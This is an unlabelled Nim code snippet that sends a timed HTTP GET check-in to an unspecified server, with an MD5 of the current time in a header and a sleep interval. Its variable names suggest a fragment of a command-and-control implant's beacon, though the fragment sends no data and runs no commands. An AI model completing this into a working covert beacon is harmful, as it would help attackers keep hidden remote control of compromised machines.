---
id: dee68ea0-ecf8-4aca-9805-463274aada3a
type: code
language: ''
verified: false
created_at: '2023-06-06T03:13:11.590100+00:00'
updated_at: '2023-06-06T16:19:30.736264+00:00'
---

# Code Snippet dee68ea0

```
let Name = getTime()
var Outp_shell_md5 = toMD5($Name) #MD5 SUM the output
let Outp_shell_md5_string = $Outp_shell_md5 #Change to variable
#echo Outp_shell_md5_string
var sendcommand = newHttpClient(userAgent= defUserAgent) #Create Connection
sendcommand.headers = newHttpHeaders({ "Content-MD5": Outp_shell_md5_string })
let sent = sendcommand.request(server & "/index", httpMethod = HttpGet)
#echo sent.status
const SLEEP = 5000
```
